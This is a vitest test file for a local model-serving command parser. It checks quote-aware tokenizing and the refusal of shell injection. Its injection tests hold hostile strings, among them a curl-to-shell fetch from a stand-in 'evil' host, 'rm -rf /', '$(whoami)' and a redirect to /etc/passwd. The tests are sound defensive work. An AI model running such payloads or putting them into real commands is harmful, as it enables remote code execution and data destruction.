/**
 * BO-F2 gate — /model/serve command handling.
 *
 * The suite that let the regression ship asserted only that the DANGEROUS
 * construct was gone: no bash -c, no shell:true. Removing the shell also
 * removed quote handling, so `--model "Qwen/Qwen3-4B-GGUF"` reached
 * llama-server as a filename containing literal `"` characters. Every gate
 * stayed green because none of them asked whether the command still worked.
 *
 * So this file asserts BOTH directions:
 *   - the metacharacter payloads are still refused          (absence of danger)
 *   - the exact command the UI builds still produces usable argv  (presence of function)
 *
 * The second half is the one that matters. It imports the real module.
 */
import { describe, expect, it } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);
const {
  tokenizeCommand,
  parseServeCommand,
  modelKey,
  isModelInstalled,
  DEFAULT_ALLOWED,
} = require('../src/blocks/cookbook/api/_serveCommand.cjs');

// The command src/blocks/cookbook/index.jsx:452 actually builds, verbatim.
const uiGgufCmd = (repo) =>
  `llama-server --model "${repo}" --host 0.0.0.0 --port 8080 -ngl 99 -c 8192`;

describe('tokenizeCommand — quotes group, nothing interprets', () => {
  it('strips the quotes the UI adds around a repo id', () => {
    const { ok, tokens } = tokenizeCommand('llama-server --model "Qwen/Qwen3-4B-GGUF"');
    expect(ok).toBe(true);
    expect(tokens).toEqual(['llama-server', '--model', 'Qwen/Qwen3-4B-GGUF']);
    expect(tokens[2]).not.toContain('"');
  });

  it('keeps a path containing spaces as ONE argument', () => {
    const { tokens } = tokenizeCommand('llama-server --model "C:/My Models/qwen 3.gguf"');
    expect(tokens).toEqual(['llama-server', '--model', 'C:/My Models/qwen 3.gguf']);
  });

  it('handles single quotes the same way', () => {
    expect(tokenizeCommand("llama-server --model 'a b.gguf'").tokens)
      .toEqual(['llama-server', '--model', 'a b.gguf']);
  });

  it('treats an empty quoted string as a real, empty argument', () => {
    expect(tokenizeCommand('llama-server --model ""').tokens)
      .toEqual(['llama-server', '--model', '']);
  });

  it('collapses runs of unquoted whitespace without emitting empty tokens', () => {
    expect(tokenizeCommand('  llama-server   --port   8080  ').tokens)
      .toEqual(['llama-server', '--port', '8080']);
  });

  it('concatenates adjacent pieces, as a shell would', () => {
    expect(tokenizeCommand('llama-server --model="a b".gguf').tokens)
      .toEqual(['llama-server', '--model=a b.gguf']);
  });

  it('refuses an unterminated quote instead of silently closing it', () => {
    const r = tokenizeCommand('llama-server --model "unclosed.gguf');
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/unterminated double quote/i);
  });

  it('does NOT treat backslash as an escape — Windows paths survive verbatim', () => {
    expect(tokenizeCommand('llama-server --model "C:\\models\\q.gguf"').tokens[2])
      .toBe('C:\\models\\q.gguf');
  });
});

describe('parseServeCommand — the security property is intact', () => {
  it('still refuses the original allowlist-bypass exploit', () => {
    const r = parseServeCommand('python; curl http://evil/x | sh');
    expect(r.ok).toBe(false);
    expect(r.status).toBe(400);
    expect(r.error).toMatch(/metacharacter/i);
  });

  it.each([
    ['semicolon',        'llama-server; rm -rf /'],
    ['pipe',             'llama-server | sh'],
    ['backtick',         'llama-server `whoami`'],
    ['dollar-subshell',  'llama-server $(whoami)'],
    ['ampersand',        'llama-server & evil'],
    ['redirect',         'llama-server > /etc/passwd'],
    ['brace',            'llama-server ${IFS}evil'],
    ['newline',          'llama-server\nrm -rf /'],
  ])('refuses %s', (_label, cmd) => {
    expect(parseServeCommand(cmd).ok).toBe(false);
  });

  // The ordering argument in _serveCommand.cjs, pinned as a test: the
  // metacharacter check runs on the RAW string, so quoting cannot become an
  // escape hatch. If someone reorders it to a per-token check after grouping,
  // this is the test that fails.
  it('quoting is NOT an escape hatch for metacharacters', () => {
    const r = parseServeCommand('llama-server --model "; curl http://evil | sh"');
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/metacharacter/i);
  });

  it('rejects a binary outside the allowlist', () => {
    const r = parseServeCommand('curl http://evil/x');
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/not allowed/i);
  });

  it('allowlists on the basename, so an absolute path to an allowed binary works', () => {
    const r = parseServeCommand('"C:/Program Files/llama/llama-server" --port 8080');
    expect(r.ok).toBe(true);
    expect(r.bin).toBe('llama-server');
    expect(r.file).toBe('C:/Program Files/llama/llama-server');
  });

  it('rejects an empty command', () => {
    expect(parseServeCommand('').ok).toBe(false);
    expect(parseServeCommand(null).ok).toBe(false);
  });

  it('every allowlisted binary is reachable', () => {
    for (const bin of DEFAULT_ALLOWED) {
      expect(parseServeCommand(`${bin} --help`).ok).toBe(true);
    }
  });
});

// ── THE GATE WHOSE ABSENCE LET THE REGRESSION SHIP ──────────────────────────
describe('the serve command still WORKS (not merely: no shell)', () => {
  it('the exact command the UI builds produces argv llama-server can open', () => {
    const r = parseServeCommand(uiGgufCmd('Qwen/Qwen3-4B-GGUF'));

    expect(r.ok).toBe(true);
    expect(r.file).toBe('llama-server');
    expect(r.args).toEqual([
      '--model', 'Qwen/Qwen3-4B-GGUF',
      '--host', '0.0.0.0',
      '--port', '8080',
      '-ngl', '99',
      '-c', '8192',
    ]);

    // The regression, stated as an assertion: no argv entry may carry a quote.
    for (const a of [r.file, ...r.args]) expect(a).not.toMatch(/["']/);
  });

  it('a model path containing a space stays one argv entry', () => {
    const r = parseServeCommand(uiGgufCmd('C:/AEON/data/My Models/qwen3.gguf'));
    expect(r.args[1]).toBe('C:/AEON/data/My Models/qwen3.gguf');
    expect(r.args).toHaveLength(10); // splitting it would make 11
  });

  it('the vLLM branch of the UI still parses', () => {
    const r = parseServeCommand(
      'vllm serve Qwen/Qwen3-4B --host 0.0.0.0 --port 8000 --dtype auto --trust-remote-code'
    );
    expect(r.ok).toBe(true);
    expect(r.file).toBe('vllm');
    expect(r.args[0]).toBe('serve');
    expect(r.args).toContain('--trust-remote-code');
  });

  it('leading VAR=value is configuration, not argv — and quoting binds it correctly', () => {
    const r = parseServeCommand('CUDA_VISIBLE_DEVICES=0 HF_TOKEN="a b" llama-server --port 8080');
    expect(r.ok).toBe(true);
    expect(r.env).toEqual({ CUDA_VISIBLE_DEVICES: '0', HF_TOKEN: 'a b' });
    expect(r.file).toBe('llama-server');
    expect(r.args).toEqual(['--port', '8080']);
  });

  it('a VAR=value AFTER the binary is an argument, not configuration', () => {
    const r = parseServeCommand('llama-server FOO=bar --port 8080');
    expect(r.env).toEqual({});
    expect(r.args).toContain('FOO=bar');
  });
});

describe('isModelInstalled — refuses only when it is sure', () => {
  const installed = ['Qwen/Qwen3-4B', 'unsloth/Qwen3-1.7B-GGUF'];

  it('matches the exact repo id', () => {
    expect(isModelInstalled('Qwen/Qwen3-4B', installed)).toBe(true);
  });

  it('matches across naming schemes (catalog id vs HF repo id vs quant suffix)', () => {
    expect(isModelInstalled('Qwen/Qwen3-4B-GGUF', installed)).toBe(true);
    expect(isModelInstalled('qwen3-1.7b', installed)).toBe(true);
  });

  it('reports not-installed for a model that is genuinely absent', () => {
    expect(isModelInstalled('meta-llama/Llama-3.1-8B-Instruct', installed)).toBe(false);
  });

  it('is false for empty input rather than throwing', () => {
    expect(isModelInstalled('', installed)).toBe(false);
    expect(isModelInstalled('Qwen/Qwen3-4B', [])).toBe(false);
    expect(isModelInstalled('Qwen/Qwen3-4B', null)).toBe(false);
  });

  it('modelKey strips quant and format suffixes but keeps the family', () => {
    expect(modelKey('unsloth/Qwen3-4B-GGUF')).toBe(modelKey('Qwen/Qwen3-4B'));
    expect(modelKey('qwen3-4b-instruct-q4_k_m.gguf')).toContain('qwen3-4b');
  });
});
